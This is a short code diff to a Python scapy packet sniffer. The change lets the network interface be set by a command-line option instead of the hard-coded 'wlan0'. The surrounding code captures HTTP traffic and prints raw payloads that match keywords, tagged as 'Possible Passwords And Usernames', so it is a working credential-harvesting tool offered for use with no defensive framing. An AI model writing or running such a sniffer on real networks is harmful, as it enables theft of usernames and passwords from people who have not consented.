@@ -1,5 +1,9 @@
 import scapy.all as scapy
 from scapy.layers import http
+import optparse
+p=optparse.OptionParser()
+p.add_option("--interface",dest="interface",help="Type your adapter's name ")
+(opt,arg) = p.parse_args()
 print "\x1b[32m [+] STARTED \x1b[0m"
 def sniff(interface):
 	scapy.sniff(iface=interface,store=False,prn=process)
@@ -13,4 +17,4 @@ def process(packet):
 				if keyword in packet[scapy.Raw].load:
 					print "\x1b[31m[+] Possible Passwords And Usernames #>>  \x1b[0m",packet[scapy.Raw].load
 					break
-sniff("wlan0")
+sniff(opt.interface)
